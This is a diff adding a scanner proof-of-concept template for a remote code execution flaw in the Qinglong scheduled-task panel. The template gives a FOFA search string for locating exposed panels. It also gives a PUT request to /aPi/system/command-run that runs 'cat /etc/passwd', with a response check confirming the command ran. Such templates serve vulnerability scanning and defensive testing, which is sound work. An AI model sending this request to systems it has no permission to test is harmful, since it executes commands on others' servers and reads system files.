@@ -1,0 +1,19 @@
+id: poc-yaml-qinglong-ttmp-command-run-rce
+info:
+  name: 青龙定时任务管理面板 command-run 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 青龙定时任务管理面板
+  fofa: app="青龙-定时任务管理面板"
+requests:
+- method: PUT
+  path: /aPi/system/command-run
+  headers:
+    Content-Type: application/json
+  data: '{"command": "cat /etc/passwd"}'
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(body,"开始执行") && contains(content_type,"application/octet-stream")
+    && !contains(body,"<")
+variables: {}
+transport: http
